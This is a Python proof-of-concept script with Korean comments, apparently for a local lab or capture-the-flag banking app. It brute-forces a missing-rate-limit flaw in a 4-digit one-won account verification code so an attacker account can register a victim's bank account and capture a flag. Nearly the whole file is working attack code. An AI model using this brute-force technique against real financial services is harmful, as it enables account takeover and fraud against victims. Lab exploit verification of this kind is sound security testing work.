#!/usr/bin/env python3
"""
verify_F1.py — F1(1원 인증 우회) 손검증 PoC. 로컬 랩 전용.

시나리오: attacker 가 victim 의 계좌를 자기 앞으로 등록(브루트포스).
  1) victim, attacker 두 계정 준비 (victim 의 account_number 확보)
  2) attacker 로 verify-init(target=victim account)
  3) 0000~9999 코드 verify-confirm 브루트포스 → FLAG

usage:  python verify_F1.py [--base http://localhost:5000]
"""
import argparse
import sys
import requests

def reg(base, u, p):
    requests.post(f"{base}/register", data={"username": u, "password": p,
                                            "confirm_password": p}, timeout=10)

def login(base, u, p):
    r = requests.post(f"{base}/api/login", json={"username": u, "password": p}, timeout=10)
    r.raise_for_status()
    return r.json().get("token") or r.json().get("access_token")

def account_of(base, token):
    r = requests.get(f"{base}/dashboard", headers={"Authorization": f"Bearer {token}"}, timeout=10)
    # dashboard HTML 에 account_number 노출. 간단 파싱.
    import re
    m = re.search(r"([0-9]{10,})", r.text)
    return m.group(1) if m else None

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="http://localhost:5000")
    a = ap.parse_args()
    base = a.base

    reg(base, "victim1", "pass123")
    reg(base, "attacker1", "pass123")
    vtok = login(base, "victim1", "pass123")
    atok = login(base, "attacker1", "pass123")
    victim_acct = account_of(base, vtok)
    if not victim_acct:
        print("[-] victim 계좌번호 파싱 실패 — /debug/users 로 수동 확인 필요")
        sys.exit(1)
    print(f"[*] victim account = {victim_acct}")

    H = {"Authorization": f"Bearer {atok}"}
    requests.post(f"{base}/api/kr/account/verify-init",
                  json={"target_account": victim_acct}, headers=H, timeout=10)
    print("[*] verify-init 완료. 코드 브루트포스 시작(0000~9999)...")

    for i in range(10000):
        code = str(i).zfill(4)
        r = requests.post(f"{base}/api/kr/account/verify-confirm",
                          json={"target_account": victim_acct, "code": code},
                          headers=H, timeout=10)
        if r.status_code == 200 and r.json().get("status") == "success":
            print(f"[+] 적중! code={code}")
            print(f"[+] flag_hint = {r.json().get('flag_hint')}")
            print("[+] F1 CAPTURED — 시도제한 부재로 타인 계좌 등록 성공")
            return
        if i % 1000 == 0 and i:
            print(f"    ...{i} tries")
    print("[-] 실패 (코드 범위 확인)")

if __name__ == "__main__":
    main()
